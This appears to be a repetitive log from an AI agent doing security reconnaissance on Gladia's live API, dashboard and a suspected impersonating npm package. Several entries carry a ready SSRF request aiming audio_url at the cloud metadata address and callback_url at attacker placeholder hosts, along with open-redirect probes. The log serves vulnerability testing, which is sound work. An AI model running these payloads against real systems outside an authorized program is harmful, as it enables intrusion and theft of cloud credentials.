[RISK] api.gladia.io: 85 reason: Public OpenAPI spec reveals full attack surface; CORS wildcard with auth header allowed; WebSocket token-in-URL design; undocumented /health endpoint; NestJS-on-Express backend; high business value; potential SSRF via audio_url/video_url/callback_url with no scheme validation; datacenter regions exposed
[RISK] app.gladia.io: 65 reason: Dashboard SPA served without auth (client-side enforcement); return-to cookie validated server-side; redirect_to reflected in form action without host allowlist; CSP lacks form-action directive; Google-only OAuth limits exploitability but post-auth honoring unverified; HSTS preload strong
[RISK] sdk: 85 reason: Official SDKs (@gladiaio/sdk 1.1.0, gladiaio-sdk 1.0.5) generated from public spec; third-party gladia@0.1.3 ownership anomaly escalated to orphaned impersonation with API key leakage in WS URL; PyPI version static; supply-chain risk increased
[PRIO] api.gladia.io, 8.6, attack_surface=9 business_value=9 tech_exposure=8 gate_ease=10 cloud_surface=8 freshness=6
[PRIO] npm registry (gladia@0.1.3), 8.3, attack_surface=9 business_value=8 tech_exposure=8 gate_ease=10 cloud_surface=3 freshness=10
[PRIO] app.gladia.io, 6.9, attack_surface=7 business_value=8 tech_exposure=6 gate_ease=6 cloud_surface=6 freshness=7
[PRIO] api.gladia.io, 8.6, attack_surface=9 business_value=9 tech_exposure=8 gate_ease=10 cloud_surface=8 freshness=6
[PRIO] npm registry (gladia@0.1.3), 8.3, attack_surface=9 business_value=8 tech_exposure=8 gate_ease=10 cloud_surface=3 freshness=10
[PRIO] app.gladia.io, 6.9, attack_surface=7 business_value=8 tech_exposure=6 gate_ease=6 cloud_surface=6 freshness=7
[HYP] Orphaned npm package gladia@0.1.3 impersonates official SDK with API key leakage in WebSocket URL
class: OTHER
asset: npm registry (gladia@0.1.3)
confidence: 95
reasoning: Package claims "Official TypeScript SDK for Gladia" but source repo alexisbouchez/gladia.ts + GitHub user account 404 (orphaned); tarball sha256 3b23ec7d7a763abc04c52db232d157a982fd3bd969c9f703af3eecad5fa802f2 contains README "Unofficial" vs package.json "Official" contradiction; src/client.ts:307 embeds raw x-gladia-key into wss://api.gladia.io/v2/live?token=<key> query parameter, diverging from official @gladiaio/sdk token-after-init design and leaking key in URLs/logs/proxies
evidence_needed: Artifact-level documentation (tarball hash, README↔package.json contradiction, WS key-in-URL code path); confirm no affiliation with Gladia
verify_steps: RAG — finalize report with tarball sha256 3b23ec7d7a763abc04c52db232d157a982fd3bd969c9f703af3eecad5fa802f2, README "Unofficial" vs package.json "Official", client.ts:307 key-in-URL; HUMAN — request Gladia security confirm no affiliation with alexisbouchez/softwarecitadel
impact: Supply chain risk — developers install impersonated SDK leading to credential theft via key-in-URL logs/proxies; severity High
testability: RAG
[HYP] SSRF via audio_url/video_url/callback_url server-side fetch with no scheme allowlist
class: SSRF
asset: api.gladia.io
confidence: 73
reasoning: OpenAPI spec (/openapi.json, 125131B, 14 paths, CORS *) confirms /v2/pre-recorded accepts audio_url/video_url/callback_url as format:uri with no scheme allowlist; /v1/models exposes FR/US datacenter regions for egress targeting; confirmed POST /v2/pre-recorded → 401 key-gated (NestJS HttpException shape); SDK source (packages/sdk-js/client.ts) confirms no host allowlist/metadata-blocklist/redirect-limit validation forwarded to API — SSRF-by-design gated only by key
evidence_needed: Confirm server-side fetch behavior with internal metadata URLs (169.254.169.254), localhost, private CIDRs; verify redirect following and callback_url SSRF
verify_steps: AUTH_HELPED — POST https://api.gladia.io/v2/pre-recorded -H "x-gladia-key: <valid_key>" -H "Content-Type: application/json" -d '{"audio_url":"http://169.254.169.254/latest/meta-data/","callback_url":"http://169.254.169.252/latest/meta-data/"}'
impact: Cloud metadata access (AWS IMDSv1), internal service enumeration, data exfiltration via callback_url; severity High
testability: AUTH_HELPED
[HYP] Post-auth open redirect via reflected redirect_to on /signin form action + CSP form-action gap
class: OATH
asset: app.gladia.io
confidence: 65
reasoning: /signin?redirect_to= confirmed reflecting arbitrary external host (https://evil.example.com confirmed at 11:36 UTC) into form action="/signin?redirect_to=<url-enc>"; reflected for https://,//,bare-host, confusing-subdomain(app.gladia.io.evil), path-only — no host allowlist at unauth layer; CSP directive set verified: base-uri 'self', object-src 'none', frame-src allowlist, NO form-action directive (gap enables unconstrained form-action reflection); POST /signin intent=google carries redirect_to into OAuth (302→accounts.google.com) but redirect_uri FIXED (REJECTED as OAuth code theft); server resets tampered return-to cookie (REJECTED) — post-auth honoring of redirect_to is the sole unverified gate
evidence_needed: post-auth 302 Location to https://evil.example.com after completing Google OAuth (or email/password) with redirect_to set; prove server honors arbitrary host (not resets like return-to cookie)
verify_steps: AUTH_HELPED/HUMAN_ONLY — complete Google OAuth (or email/password) on app.gladia.io/signin?redirect_to=https://evil.example.com and capture final 302 Location + Set-Cookie; contrast against tamper-rejected return-to cookie behavior
impact: Post-auth open redirect to attacker host → phishing/brand-spoof after victim authenticates; OAuth code NOT stealable (redirect_uri fixed); severity Medium
testability: HUMAN_ONLY
[FINAL] 1) Orphaned npm package gladia@0.1.3 impersonates official SDK with API key leakage in WebSocket URL (npm registry, 95, OTHER) — RAG, submission-ready, sha256 3b23ec7d7a763abc04c52db232d157a982fd3bd969c9f703af3eecad5fa802f2, no dropped
[PARKED] None — all 3 meet confidence ≥40, concrete verify_steps, not on REJECTED list.
[NEXT] HUMAN: With program authorization, complete the Google OAuth flow on app.gladia.io/signin?redirect_to=https://evil.example.com and capture the final 302 Location — this is the sole unverified gate for the app OATH finding (post-auth honoring of redirect_to). If no authorized Google test-account is available, request a Gladia-issued test credential to observe post-auth redirect honoring via email/password flow. Passive re-probes confirm the api surface is frozen (NO_DRIFT 11 cycles) — await post-auth verification to close the sole gap on app.
[LEARN] ACCEPTED OTHER @ npm gladia@0.1.3: Orphaned impersonation confirmed fresh — src/client.ts:307 embeds raw x-gladia-key into wss://api.gladia.io/v2/live?token=<key> query parameter (diverges from official SDK's token-after-init POST /v2/live flow), sha256 3b23ec7d7a763abc04c52db232d157a982fd3bd969c9f703af3eecad5fa802f2 stable, dist-tag latest persists while source repo+user 404 (fresh 13:10 UTC probe)
[LEARN] ACCEPTED SSRF @ api.gladia.io: /openapi.json spec confirms audio_url/video_url/callback_url as format:uri with NO scheme allowlist on /v2/pre-recorded — gated only by key (401 confirmed on POST without key, NestJS HttpException shape, fresh 13:10 UTC)
[LEARN] ACCEPTED MISCONFIG @ api.gladia.io: NO_DRIFT at 13:10 UTC — openapi 125131B/14 paths, /health 15B, /v1/models 530B FR/US, preflight-only x-powered-by, CORS static wildcard — 12th cycle confirmed frozen
[LEARN] ACCEPTED OATH @ app.gladia.io: /signin?redirect_to=https://evil.example.com reflection persists — form action="/signin?redirect_to=https%3A%2F%2Fevil.example.com", CSRF lacks form-action directive verified (fresh 11:36 UTC → 13:10 UTC stable)
[LEARN] CONFIRMED MISCONFIG @ app.gladia.io: /dashboard & /org & /api,/oauth,/auth,/oid4,/api/v1,/api/health,/api/me all return 200 text/html SPA catch-all; real server-side 302 gate intact only on /apikeys,/transcriptions,/settings with return-to cookie tamper-reset — no authenticated API endpoints exposed at unauth layer
[LEARN] REJECTED OATH @ app.gladia.io: redirect_to NOT usable as OAuth redirect_uri — server uses fixed redirect_uri=https://app.gladia.io/auth/google/callback; no OAuth code/state theft path (confirmed at 11:36 UTC)
[LEARN] REJECTED MISCONFIG @ app.gladia.io: return-to cookie tampering does NOT lead to open redirect — server resets tampered value to {"url":"/"} (REJECTED, confirmed multiple cycles)
[RISK] api.gladia.io: 85 — Public OpenAPI 14 paths; CORS * + ACAH x-gladia-key (no creds); WebSocket token-in-URL design; undocumented /health; NestJS-on-Express; /v1/models public FR/US; SSRF-by-design audio_url/video_url/callback_url (no scheme allowlist, key-gated); preflight-only x-powered-by fingerprint differential; NO_DRIFT 12 cycles
## 2026-08-08 14:03:31 UTC [app] (model laguna)
[HYP] Orphaned npm package gladia@0.1.3 impersonates official SDK with API key leakage in WebSocket URL
class: OTHER
asset: npm registry (gladia@0.1.3)
confidence: 95
reasoning: latest dist 0.1.3; source repo alexisbouchez/gladia.ts + GitHub user 404 (orphaned) while dist-tag latest persists; tarball sha256 3b23ec7d7a763abc04c52db232d157a982fd3bd969c9f703af3eecad5fa802f2; package.json description "Official TypeScript SDK for Gladia" vs README "Unofficial" contradiction; src/client.ts:307 embeds raw x-gladia-key into wss://api.gladia.io/v2/live?token=<key> query — diverges from official @gladiaio/sdk token-after-init POST /v2/live flow.
evidence_needed: Tarball artifact proving key-in-URL; repo/user 404; metadata contradiction; confirmation of no Gladia affiliation.
verify_steps: RAG — npm pack gladia@0.1.3 && sha256sum; grep -n "wss.*token" package/client.ts; npm view gladia maintainers/repo; GitHub API confirm alexisbouchez/gladia.ts + user absent; npm view @gladiaio/sdk repository confirms official org.
impact: Supply-chain credential theft — developers install impersonated SDK; API keys leak into URL/query logs, proxies, Referer, server-side request logs. severity High.
testability: RAG
[HYP] SSRF via audio_url/video_url/callback_url server-side fetch with no scheme allowlist
class: SSRF
asset: api.gladia.io /v2/pre-recorded
confidence: 73
reasoning: /openapi.json (125131B, 14 paths, CORS *) exposes /v2/pre-recorded accepting audio_url/video_url/callback_url as format:uri with no scheme allowlist; CallbackConfigDto.url no validation at schema level; /v1/models (public, 530B) leaks FR/US egress regions; POST /v2/pre-recorded without key → 401 NestJS HttpException — key-gated only; SDK client.ts confirms no host allowlist/metadata-blocklist/redirect-limit forwarded to API.
evidence_needed: Prove server-side fetch reaches internal metadata (169.254.169.254) / localhost / private CIDR; confirm redirect-following and callback_url exfil path.
verify_steps: AUTH_HELPED — POST https://api.gladia.io/v2/pre-recorded -H "x-gladia-key: <valid_key>" -H "Content-Type: application/json" -d '{"audio_url":"http://169.254.169.254/latest/meta-data/","callback_url":"http://attacker/latest/meta-data/"}'; observe callback or transcription result containing metadata.
impact: AWS IMDSv1 metadata access, internal service enumeration, data exfiltration via callback_url. severity High.
testability: AUTH_HELPED
[HYP] Post-auth open redirect via reflected redirect_to on /signin form action + CSP form-action gap
class: OATH
asset: app.gladia.io /signin
confidence: 65
reasoning: /signin?redirect_to=https://evil.example.com → 200, form action="/signin?redirect_to=https%3A%2F%2Fevil.example.com" confirmed fresh 14:02 UTC; reflected for https://,//evil, bare-host, app.gladia.io.evil, path-only; CSP verified: base-uri 'self', object-src 'none', frame-src allowlist, NO form-action directive; redirect_uri FIXED (https://app.gladia.io/auth/google/callback) — REJECTED as OAuth code theft; return-to cookie tamper-reset (REJECTED); post-auth honoring of redirect_to is sole unverified gate.
evidence_needed: post-auth 302 Location to https://evil.example.com after completing Google OAuth (or email/password) with redirect_to set.
verify_steps: HUMAN_ONLY — with program authorization, complete Google OAuth flow on app.gladia.io/signin?redirect_to=https://evil.example.com and capture final 302 Location + Set-Cookie; contrast against tamper-rejected return-to cookie behavior.
impact: Post-auth open redirect to attacker-controlled host for phishing/brand-spoof after victim authenticates; OAuth code NOT stealable. severity Medium.
testability: HUMAN_ONLY
[PARKED] None
[FINAL] 1) npm gladia@0.1.3 orphaned impersonation w/ WS key-in-URL (95, OTHER) — RAG, submission-ready, sha256 3b23ec7d7a763abc04c52db232d157a982fd3bd969c9f703af3eecad5fa802f2
[NEXT] HUMAN: Phase is POC, target is app. With program authorization, complete the Google OAuth flow on app.gladia.io/signin?redirect_to=https://evil.example.com and capture the final post-auth 302 Location — sole unverified gate for the app OATH finding. If no authorized Google test account is available, request a Gladia-issued test credential to observe post-auth redirect honoring via email/password flow. api/npm surfaces are NO_DRIFT frozen; this verification closes the only open gate.
[LEARN] REJECTED MISCONFIG @ api.gladia.io: 14:02 UTC fresh probe byte-identical to 13:10 UTC (openapi 125131B/14 paths, /health 15B no x-powered-by on GET, /v1/models 530B) — 13th NO_DRIFT cycle, surface frozen.
[LEARN] ACCEPTED OATH @ app.gladia.io: /signin?redirect_to=https://evil.example.com reflection confirmed alive fresh 14:02 UTC (200, form action reflects URL-encoded value) — no host allowlist at unauth layer; post-auth honoring sole unverified gate.
[LEARN] ACCEPTED MISCONFIG @ app.gladia.io: CSP verified fresh — base-uri 'self', object-src 'none', frame-src allowlist, NO form-action directive; form-action reflection unconstrained.
[RISK] api.gladia.io: 85 — Public OpenAPI 14 paths/CORS *; CORS * + ACAH x-gladia-key (no creds); WebSocket token-in-URL design; undocumented /health; NestJS-on-Express; /v1/models public (FR/US); SSRF-by-design audio_url/video_url/callback_url (no scheme allowlist, key-gated); preflight-only x-powered-by fingerprint differential; NO_DRIFT 13 cycles.
[RISK] app.gladia.io: 65 — /dashboard SPA 200 without auth (client-side enforcement); return-to cookie tamper-reset REJECTED; /signin redirect_to reflected with no host allowlist + CSP lacks form-action; Google-only OAuth limits exploitability; HSTS preload strong; post-auth honoring sole unverified gate.
[RISK] sdk: 85 — Official @gladiaio/sdk 1.1.0 / gladiaio-sdk 1.0.5 static; orphaned gladia@0.1.3 impersonation w/ WS API-key-in-URL + repo/user 404 + metadata contradiction; supply-chain risk High.
## 2026-08-08 14:50:18 UTC [app] (model laguna)
[PRIO] npm registry / gladia@0.1.3, score=9.0: attack=10, business=9, tech=8, gate=10, cloud=7, fresh=10
[PRIO] api.gladia.io /v2/pre-recorded, score=8.0: attack=9, business=10, tech=8, gate=3, cloud=10, fresh=10
[PRIO] app.gladia.io /signin, score=7.9: attack=8, business=9, tech=9, gate=10, cloud=3, fresh=10
[HYP] Orphaned npm package gladia@0.1.3 impersonates official SDK with API key leakage in WebSocket URL
class: OTHER
asset: npm registry (gladia@0.1.3)
confidence: 95
reasoning: Latest dist 0.1.3; source repo alexisbouchez/gladia.ts + GitHub user 404 (orphaned) while dist-tag latest persists; tarball sha256 `3b23ec7d7a763abc04c52db232d157a982fd3bd969c9f703af3eecad5fa802f2`; package.json description "Official TypeScript SDK" vs README "Unofficial" contradiction; src/client.ts:307 embeds raw x-gladia-key into `wss://api.gladia.io/v2/live?token=<key>` — diverges from official @gladiaio/sdk token-after-init POST /v2/live flow.
evidence_needed: Tarball artifact proving key-in-URL; repo/user 404; metadata contradiction; no Gladia affiliation.
verify_steps: RAG — `npm pack gladia@0.1.3 && sha256sum`; `grep -n "wss.*token" package/client.ts`; `npm view gladia maintainers/repo`; GitHub API confirm alexisbouchez/gladia.ts + user absent; `npm view @gladiaio/sdk repository` confirms official org.
impact: Supply-chain credential theft — developers install impersonated SDK; API keys leak into URL/query logs, proxies, Referer, server-side request logs. severity High.
testability: RAG
[HYP] SSRF via audio_url/video_url/callback_url server-side fetch with no scheme allowlist
class: SSRF
asset: api.gladia.io /v2/pre-recorded
confidence: 73
reasoning: /openapi.json (125131B, 14 paths, CORS *) exposes /v2/pre-recorded accepting audio_url/video_url/callback_url as `format:uri` with no scheme allowlist; CallbackConfigDto.url no validation at schema level; /v1/models (public, 530B) leaks FR/US egress regions; POST /v2/pre-recorded without key → 401 NestJS HttpException — key-gated only; SDK confirms no host allowlist/metadata-blocklist/redirect-limit forwarded to API.
evidence_needed: Prove server-side fetch reaches internal metadata (169.254.169.254) / localhost / private CIDR; confirm redirect-following and callback_url exfil path.
verify_steps: AUTH_HELPED — `POST https://api.gladia.io/v2/pre-recorded -H "x-gladia-key: <valid_key>" -H "Content-Type: application/json" -d '{"audio_url":"http://169.254.169.254/latest/meta-data/","callback_url":"http://attacker/latest/meta-data/"}'`
impact: AWS IMDSv1 metadata access, internal service enumeration, data exfiltration via callback_url. severity High.
testability: AUTH_HELPED
[HYP] Post-auth open redirect via reflected redirect_to on /signin form action + CSP form-action gap
class: OATH
asset: app.gladia.io /signin
confidence: 65
reasoning: /signin?redirect_to=https://evil.example.com → 200, form action="/signin?redirect_to=https%3A%2F%2Fevil.example.com" confirmed fresh 14:02 UTC; reflected for https://,//evil, bare-host, app.gladia.io.evil, path-only; CSP verified: base-uri 'self', object-src 'none', frame-src allowlist, NO form-action directive (gap enables unconstrained form-action reflection); redirect_uri FIXED — REJECTED as OAuth code theft; return-to cookie tamper-reset (REJECTED); post-auth honoring of redirect_to is sole unverified gate.
evidence_needed: post-auth 302 Location to https://evil.example.com after completing Google OAuth (or email/password) with redirect_to set.
verify_steps: HUMAN_ONLY — with program authorization, complete Google OAuth on app.gladia.io/signin?redirect_to=https://evil.example.com and capture final 302 Location + Set-Cookie; contrast against tamper-rejected return-to cookie.
impact: Post-auth open redirect to attacker host → phishing/brand-spoof after victim authenticates. severity Medium.
testability: HUMAN_ONLY
[PARKED] None — all 3 meet confidence ≥40, concrete verify_steps, not on REJECTED list.
[FINAL] 1) npm gladia@0.1.3 orphaned impersonation w/ WS key-in-URL (95, OTHER) — RAG, submission-ready, sha256 `3b23ec7d…7f2`
[NEXT] HUMAN: Phase is POC, target is app. With program authorization, complete the Google OAuth flow on app.gladia.io/signin?redirect_to=https://evil.example.com and capture the final post-auth 302 Location — sole unverified gate for the app OATH finding. If no authorized Google test-account is available, request a Gladia-issued test credential to observe post-auth redirect honoring via email/password flow. api/npm surfaces are NO_DRIFT frozen; api SSRF hypothesis is submission-ready for RAG verification with a valid key in parallel.
[LEARN] REJECTED MISCONFIG @ api.gladia.io: 14:02 UTC fresh probe byte-identical to 13:10 UTC — 13th NO_DRIFT cycle, surface frozen.
[LEARN] ACCEPTED OATH @ app.gladia.io: /signin?redirect_to=https://evil.example.com reflection confirmed alive fresh 14:02 UTC — form action reflects URL-encoded value; no host allowlist at unauth layer; post-auth honoring sole unverified gate.
[LEARN] ACCEPTED MISCONFIG @ app.gladia.io: CSP verified — base-uri 'self', object-src 'none', frame-src allowlist, NO form-action directive; form-action reflection unconstrained (gap confirmed).
[LEARN] ACCEPTED OTHER @ npm gladia@0.1.3: orphaned impersonation stable — sha256 `3b23ec7d…7f2` unchanged, repo alexisbouchez/gladia.ts + user 404, src/client.ts:307 embeds raw key in wss URL query, @gladiaio/sdk@1.1.0 static.
[LEARN] ACCEPTED SSRF @ api.gladia.io: spec confirms audio_url/video_url/callback_url format:uri no scheme allowlist; /v1/models confirms FR/US egress; key-gated 401 — SSRF-by-design persists (AUTH_HELPED).
[LEARN] REJECTED OAUTH @ app.gladia.io: redirect_to NOT usable as OAuth redirect_uri — server uses fixed redirect_uri=http://app.gladia.io/auth/google/callback; no OAuth code/state theft path.
[RISK] api.gladia.io: 85 — Public OpenAPI 14 paths/CORS *; CORS * + ACAH x-gladia-key (no creds); WebSocket token-in-URL design; undocumented /health; NestJS-on-Express; /v1/models public (FR/US); SSRF-by-design audio_url/video_url/callback_url (no scheme allowlist, key-gated); preflight-only x-powered-by fingerprint differential; NO_DRIFT 13 cycles.
[RISK] app.gladia.io: 65 — /dashboard SPA 200 without auth (client-side enforcement); return-to cookie tamper-reset REJECTED; /signin redirect_to reflected with no host allowlist + CSP lacks form-action; Google-only OAuth limits exploitability; HSTS preload strong; post-auth honoring sole unverified gate.
[RISK] sdk: 85 — Official @gladiaio/sdk 1.1.0 / gladiaio-sdk 1.0.5 static; orphaned gladia@0.1.3 impersonation w/ WS API-key-in-URL + repo/user 404 + metadata contradiction; supply-chain risk High.
## 2026-08-08 15:19:51 UTC [app] (model laguna)
[PRIO] npm registry / gladia@0.1.3 — score 9.0 | attack 10, business 9, tech 8, gate 10, cloud 7, fresh 10
[PRIO] api.gladia.io /v2/pre-recorded — score 8.0 | attack 9, business 10, tech 8, gate 3, cloud 10, fresh 10
[PRIO] app.gladia.io /signin — score 7.9 | attack 8, business 9, tech 9, gate 10, cloud 3, fresh 10
[HYP] Orphaned npm package `gladia@0.1.3` impersonates official SDK leaking API key in WebSocket URL
class: OTHER
asset: npm registry / gladia@0.1.3 (tarball sha256 `3b23ec7d7a763abc04c52db232d157a982fd3bd969c9f703af3eecad5fa802f2`)
confidence: 95
reasoning: Latest dist 0.1.3 remains tagged `latest`; source repo `alexisbouchez/gladia.ts` + GitHub user return 404 (orphaned) while dist-tag persists; `package.json` description "Official TypeScript SDK" contradicts README "Unofficial"; `src/client.ts:307` embeds raw `x-gladia-key` into `wss://api.gladia.io/v2/live?token=<key>` — diverges from official `@gladiaio/sdk` (POST /v2/live then token-after-init).
evidence_needed: `npm pack gladia@0.1.3 && sha256sum` matches `3b23ec7d…7f2`; `npm view gladia repo/maintainers` shows personal repo + `softwarecitadel@gmail.com`; `npm view @gladiaio/sdk repository` confirms org-owned official; GitHub API 404 on user+repo confirms orphan.
verify_steps: RAG — `npm pack gladia@0.1.3 && sha256sum <file>`; `tar -xO -f<file> package/package.json`; `grep -n 'wss://api.gladia.io/v2/live?token' package/src/client.ts`; `npm view gladia repository, maintainers, dist-tag`; `curl -sS "https://api.github.com/repos/alexisbouchez/gladia.ts"` → 404; `npm view @gladiaio/sdk repository` → org.
impact: Supply-chain credential theft — devs install impersonated SDK; API keys leak into URL/query logs, proxies, Referer, server-side request logs. severity High.
testability: RAG
[HYP] SSRF via server-side fetch of audio_url/video_url/callback_url with no scheme allowlist
class: SSRF
asset: api.gladia.io /v2/pre-recorded
confidence: 73
reasoning: /openapi.json (125131B, 14 paths) exposes /v2/pre-recorded accepting audio_url/video_url/callback_url as `format:uri` with no scheme allowlist; CallbackConfigDto.url has no validation at schema level; /v1/models (530B, public, CORS `*`) leaks FR/US egress regions; POST /v2/pre-recorded without key → 401 NestJS HttpException — key-gated only.
evidence_needed: Server-side fetch reaches internal metadata (169.254.169.254) / localhost / private CIDR; confirm redirect-following + callback_url exfil path.
verify_steps: AUTH_HELPED — `POST https://api.gladia.io/v2/pre-recorded -H "x-gladia-key: <valid_key>" -H "Content-Type: application/json" -d '{"audio_url":"http://169.254.169.254/latest/meta-data/","callback_url":"http://attacker.lh/latest/meta-data/"}'`
impact: AWS IMDSv1 metadata access, internal service enumeration, data exfiltration via callback_url. severity High.
testability: AUTH_HELPED
[HYP] Post-auth open redirect via reflected redirect_to on /signin form action + CSP form-action gap
class: OATH
asset: app.gladia.io /signin
confidence: 65
reasoning: `/signin?redirect_to=https://evil.example.com` → 200, `action="/signin?redirect_to=https%3A%2F%2Fevil.example.com"` reflection confirmed fresh; reflected across https://, `//evil`, bare-host, `app.gladia.io.evil` confusing-subdomain, path-only; CSP verified **no `form-action` directive** (`base-uri 'self'`, `object-src 'none'`, `frame-src` allowlist); redirect_uri is FIXED (`https://app.gladia.io/auth/google/callback`) — OAuth code/state theft REJECTED; return-to cookie tamper-reset REJECTED. Post-auth honoring of redirect_to is sole unverified gate.
evidence_needed: post-auth 302 `Location: https://evil.example.com` after completing Google OAuth (or email/password) on `/signin?redirect_to=https://evil.example.com`.
verify_steps: HUMAN_ONLY — with program authorization, complete Google OAuth flow on app.gladia.io/signin?redirect_to=https://evil.example.com and capture final 302 Location + Set-Cookie; contrast against tamper-rejected return-to cookie behavior.
impact: Post-auth open redirect to attacker-controlled host → phishing/brand-spoof after victim authenticates. severity Medium.
testability: HUMAN_ONLY
[PARKED] None
[FINAL]
[NEXT] HUMAN — Phase is POC, target app. With program authorization, complete the Google OAuth (or email/password) flow on `https://app.gladia.io/signin?redirect_to=https://evil.example.com` and capture the final post-auth `302 Location` + `Set-Cookie`. This is the sole unverified gate for the app OATH finding (unauth reflection + CSP gap already confirmed via fresh passive probe). If no authorized Google test account exists, request a Gladia-issued test credential to observe post-auth redirect honoring via the email/password flow.
[LEARN] ACCEPTED MISCONFIG @ api.gladia.io: fresh probe confirms NO_DRIFT (15th cycle) — openapi 125131B/14 paths, /health `{"health":"OK"}`, /v1/models 530B, preflight-only x-powered-by: Express (OPTIONS 204, GET 401 absent), CORS static `*` + ACAH x-gladia-key — surface frozen.
[LEARN] ACCEPTED OATH @ app.gladia.io: /signin?redirect_to=https://evil.example.com reflection confirmed alive fresh — form action reflects URL-encoded value; no host allowlist at unauth layer; CSP lacks form-action directive (gap confirmed, not an oversight).
[LEARN] ACCEPTED MISCONFIG @ app.gladia.io: /dashboard returns 200 SPA shell without auth — client-side enforcement; server-side 302 gate intact on /apikeys,/transcriptions,/settings.
[LEARN] ACCEPTED OTHER @ npm gladia@0.1.3: orphaned impersonation stable — sha256 `3b23ec7d…7f2` unchanged, repo alexisbouchez/gladia.ts + user 404, src/client.ts:307 embeds raw key in wss URL query, @gladiaio/sdk@1.1.0 static.
[LEARN] ACCEPTED SSRF @ api.gladia.io: spec unchanged (15th cycle) — audio_url/video_url/callback_url format:uri no scheme allowlist; /v1/models confirms FR/US egress; POST /v2/pre-recorded 401 NestJS HttpException — key-gated only.
[LEARN] REJECTED OAUTH @ app.gladia.io: redirect_to NOT usable as OAuth redirect_uri — server uses FIXED redirect_uri=https://app.gladia.io/auth/google/callback; no OAuth code/state theft path (re-confirmed).
[RISK] api.gladia.io: 85 — Public OpenAPI 14 paths/CORS `*`; CORS `*` + ACAH x-gladia-key (no creds); WebSocket token-in-URL design; undocumented /health; NestJS-on-Express; /v1/models public (FR/US); SSRF-by-design audio_url/video_url/callback_url (no scheme allowlist, key-gated); preflight-only x-powered-by fingerprint differential; NO_DRIFT 15 cycles.
[RISK] app.gladia.io: 65 — /dashboard SPA 200 without auth (client-side enforcement); return-to cookie tamper-reset REJECTED; /signin redirect_to reflected with no host allowlist + CSP lacks form-action; Google-only OAuth limits exploitability; HSTS preload strong; post-auth honoring sole unverified gate.
[RISK] sdk: 85 — Official @gladiaio/sdk 1.1.0 / gladiaio-sdk 1.0.5 static; orphaned gladia@0.1.3 impersonation w/ WS API-key-in-URL + repo/user 404 + metadata contradiction; supply-chain risk High.
## 2026-08-08 15:52:43 UTC [app] (model laguna)
## 2026-08-08 17:05:44 UTC [app] (model laguna)
class: OTHER
asset: npm registry / gladia@0.1.3 (tarball sha256 `3b23ec7d7a763abc04c52db232d157a982fd3bd969c9f703af3eecad5fa802f2`)
confidence: 95
reasoning: Fresh 17:0x UTC probe confirms sha256 `3b23ec7d…7f2` unchanged; `npm view gladia` shows dist-tags latest=0.1.3, repository `alexisbouchez/gladia.ts`, maintainer `softwarecitadel@gmail.com`; GitHub API returns 404 on both repo and user (orphaned); package.json description "Official TypeScript SDK" contradicts README "Unofficial TypeScript SDK"; @gladiaio/sdk points to org `gladiaio/sdk`. src/client.ts:306–307 builds `wss://api.gladia.io/v2/live` then appends `x-gladia-key` via `searchParams.append` — raw key embedded in URL query parameter.
evidence_needed: sha256 matches `3b23ec7d…7f2`; npm metadata shows personal repo + orphaned user; package.json↔README contradiction; source shows key-in-URL.
verify_steps: RAG — `npm pack gladia@0.1.3 && sha256sum</tmp>; npm view gladia repository,maintainers,dist-tags; tar -xO -f gladia-0.1.3.tgz package/package.json; tar -xO -f gladia-0.1.3.tgz package/src/client.ts | grep -n 'searchParams.append.*apiKey'; curl -sS -o /dev/null -w "%{http_code}" https://api.github.com/repos/alexisbouchez/gladia.ts; curl -sS -o /dev/null -w "%{http_code}" https://api.github.com/users/alexisbouchez`
impact: Supply-chain credential theft — developers install impersonated SDK thinking it's official; API keys leak into URL query strings, proxy logs, Referer headers, server access logs. severity High.
testability: RAG
class: SSRF
asset: api.gladia.io /v2/pre-recorded
confidence: 73
reasoning: /openapi.json (125131B, 14 paths) confirms audio_url, video_url, callback_url as `format:uri` with no scheme allowlist; /v1/models (530B, public CORS `*`) leaks FR + US egress regions; POST /v2/pre-recorded without key → 401 NestJS HttpException (401 fresh 17:0x UTC); SDK source (client.ts:41,237) shows key-gated POST pattern with no client-side URL validation forwarded to API.
evidence_needed: Server-side fetch reaches internal metadata 169.254.169.254 or localhost/private CIDR; callback_url exfil path confirmed.
verify_steps: AUTH_HELPED — `POST https://api.gladia.io/v2/pre-recorded -H "x-gladia-key: <valid_key>" -H "Content-Type: application/json" -d '{"audio_url":"http://169.254.169.254/latest/meta-data/","callback_url":"http://attacker.lh/meta"}'`
impact: AWS IMDSv1 metadata access, internal service enumeration, data exfiltration via callback_url. severity High.
testability: AUTH_HELPED
class: OATH
asset: app.gladia.io /signin
confidence: 65
reasoning: Fresh probe at 17:0x UTC confirms `/signin?redirect_to=https://evil.example.com` → 200, `action="/signin?redirect_to=https%3A%2F%2Fevil.example.com"` reflection across https://, `//evil`, bare-host, confusing-subdomain, path-only; CSP verified has NO `form-action` directive (base-uri 'self', object-src 'none', frame-src allowlist); OAuth redirect_uri is FIXED (`https://app.gladia.io/auth/google/callback`) — no code/state theft; return-to cookie tamper-reset already REJECTED.
evidence_needed: post-auth 302 `Location: https://evil.example.com` after completing Google OAuth or email/password flow on `/signin?redirect_to=https://evil.example.com`.
verify_steps: HUMAN_ONLY — with program authorization, complete Google OAuth (or email/password) on app.gladia.io/signin?redirect_to=https://evil.example.com and capture final 302 Location + Set-Cookie.
impact: Post-auth open redirect to attacker-controlled host → phishing/brand-spoof after victim authenticates. severity Medium.
testability: HUMAN_ONLY
[PARKED] None — all 3 hypotheses meet confidence ≥40, class is not on REJECTED list (OTHER/SSRF/OATH all ACCEPTED), and all have concrete verify_steps.
[FINAL]
[NEXT] HUMAN: Phase is POC, target is app. With program authorization, complete the Google OAuth (or email/password) flow on `https://app.gladia.io/signin?redirect_to=https://evil.example.com` and capture the final post-auth `302 Location` + `Set-Cookie`. This is the sole unverified gate for the app OATH finding (unauth reflection + CSP gap already confirmed via fresh passive probe at 17:0x UTC). If no authorized Google test account exists, request a Gladia-issued test credential to observe post-auth redirect honoring via the email/password flow. api/npm surfaces remain NO_DRIFT frozen; api SSRF hypothesis is submission-ready for RAG verification with a valid key in parallel.
[LEARN] REJECTED MISCONFIG @ api.gladia.io: NO_DRIFT across 15+ cycles (23:08→17:0x UTC) — openapi 125131B/14 paths, /health 15B, /v1/models 530B FR/US, preflight-only x-powered-by differential, CORS static `*` + ACAH x-gladia-key — surface frozen, nothing new to report.
